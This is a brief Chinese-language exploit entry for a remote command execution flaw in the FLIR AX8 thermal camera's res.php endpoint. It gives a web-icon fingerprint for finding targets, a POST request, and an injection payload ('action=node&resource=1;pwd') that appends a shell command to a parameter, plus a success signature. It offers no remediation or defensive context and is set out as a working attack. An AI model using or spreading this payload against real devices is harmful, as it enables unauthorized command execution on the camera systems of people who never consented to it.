# FLIR-AX8热成像仪res.php存在远程命令执行漏洞

FLIR ｜ 命令执行 ｜ —
- **指纹**：`web.icon=="f4370ff0b4763e18159cd7cdf36a4542"`
- **请求**：`POST /res.php HTTP/1.1`

**Payload**
```
action=node&resource=1;pwd
```
- **响应特征**：200